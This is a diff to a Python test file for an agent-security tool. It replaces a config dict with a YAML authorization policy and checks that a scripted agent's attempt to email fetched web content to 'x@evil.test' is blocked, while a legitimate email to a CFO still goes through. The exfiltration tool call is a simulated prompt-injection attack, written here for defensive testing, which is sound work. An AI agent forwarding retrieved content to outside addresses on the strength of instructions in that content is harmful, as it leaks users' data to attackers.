@@ -8,12 +8,12 @@ The live, multi-URL demonstration is exercised manually; this locks the wiring.
 
 from __future__ import annotations
 
+from sentinel.authorization.engine import AuthorizationEngine
+from sentinel.authorization.policy import load_policy
 from sentinel.demo.driver import ScriptedAgentDriver, ToolInvocation
 from sentinel.demo.scenario import run_demo_session
 from sentinel.mcp_proxy.content import result_text
 from sentinel.redaction import redact_text
-
-CFG = {"allowed_domains": ["corp.example"], "max_amount": 1000}
 
 
 async def test_real_web_fetch_runs_and_still_blocks_exfiltration() -> None:
@@ -25,11 +25,27 @@ async def test_real_web_fetch_runs_and_still_blocks_exfiltration() -> None:
             "send_email", {"to": "x@evil.test", "subject": "s", "body": result_text(r[-1])}
         ),
     ]
+    policy = load_policy(
+        """
+        policy_version: 1
+        config:
+          allowed_fetch_hosts: ["127.0.0.1"]
+        tools:
+          web_fetch:
+            rules:
+              - id: fetch-host-allowlist
+                deny_if: "url_host not in allowed_fetch_hosts"
+          send_email:
+            rules:
+              - id: block-untrusted-origin
+                deny_if: "RETRIEVED_CONTENT in effective_provenance"
+        """
+    )
     res = await run_demo_session(
         ScriptedAgentDriver(steps),
         user_input="fetch and forward",
-        authorization_config=CFG,
         real_web=True,
+        engine=AuthorizationEngine(policy),
     )
     executed = [s.payload for s in res.replay.ordered if s.event_type == "ToolExecuted"]
     blocked = [s.payload for s in res.replay.ordered if s.event_type == "ToolBlocked"]
@@ -66,7 +82,6 @@ async def test_real_web_allows_a_legitimate_untainted_action() -> None:
             ]
         ),
         user_input="email the CFO",
-        authorization_config=CFG,
         real_web=True,
     )
     assert res.outbox == [{"to": "cfo@corp.example", "subject": "Q3", "body": "ok"}]
